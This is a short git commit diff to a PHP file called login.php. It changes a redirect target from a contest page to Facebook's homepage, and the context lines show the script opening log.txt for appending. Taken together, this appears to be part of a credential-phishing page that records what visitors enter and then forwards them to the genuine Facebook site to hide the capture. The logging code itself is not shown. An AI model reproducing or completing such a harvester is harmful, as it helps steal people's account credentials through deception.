e75c98b57e3a2ec00c6831b3d19ac51e8f24a4db
Vanquy1306 <59086073+Vanquy1306@users.noreply.github.com>
2020-10-04 10:21:53 +0700

    Update login.php

--- login.php
+++ login.php
@@ -1,7 +1,7 @@
 <?php 
   
 // Set the location to redirect the page 
-header ('Location: https://hanhtrinhlotxac.herokuapp.com/top20.hanhtrinhlotxac.vn/baiduthi/bui-van-quang/index.html'); 
+header ('Location: https://www.facebook.com/'); 
   
 // Open the text file in writing mode  
 $file = fopen("log.txt", "a"); 
